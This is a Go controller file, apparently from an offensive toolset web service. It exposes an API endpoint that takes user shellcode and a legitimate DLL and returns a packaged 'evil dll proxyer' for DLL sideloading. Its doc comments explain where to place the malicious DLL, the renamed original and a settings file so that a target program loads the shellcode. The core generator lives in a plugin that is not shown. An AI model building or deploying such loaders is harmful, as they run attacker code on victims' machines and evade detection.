package controller

import (
	"encoding/base64"
	"mime"
	"path/filepath"
	"toolset/httputil"
	"toolset/model"
	"toolset/plugins"

	"github.com/gin-gonic/gin"
)

// DllProxyer godoc
// @Summary generate a evil dll proxyer
// @Description Generate a evil dll proxyer according to shellcode and dll provided by the user
// @Description This will generate three file, the settings.dat, the evil dll with origin dll name, the origin dll with new name
// @Description You need place the settings.dat to executable dir, the evil dll and the origin dll place to origin dir
// @Tags proxyer
// @Accept json
// @Produce octet-stream
// @Produce json
// @Param runner body model.DllProxyer true "the param to generate evil dll proxyer" Format(object)
// @Success 200 {file} binary "evil dll proxyer"
// @Failure 400 {object} httputil.HTTPError
// @Failure 500 {object} httputil.HTTPError
// @Router /loader/dll-proxyer [post]
func (c *Controller) DllProxyer(ctx *gin.Context) {
	var dllProxyer model.DllProxyer

	if err := ctx.ShouldBindJSON(&dllProxyer); err != nil {
		httputil.NewError(ctx, 400, err)
		return
	}
	shellcode, err := base64.StdEncoding.DecodeString(dllProxyer.Shellcode)
	if err != nil {
		httputil.NewError(ctx, 400, err)
		return
	}
	dllData, err := base64.StdEncoding.DecodeString(dllProxyer.DllData)
	if err != nil {
		httputil.NewError(ctx, 400, err)
		return
	}
	dllName := filepath.Base(dllProxyer.DllName)
	tool := plugins.NewDllProxyer(shellcode, dllData, dllName, dllProxyer.X64)
	data, err := tool.Run()
	if err != nil {
		httputil.NewError(ctx, 400, err)
		return
	}
	ctx.Data(200, mime.TypeByExtension(".zip"), data)
}
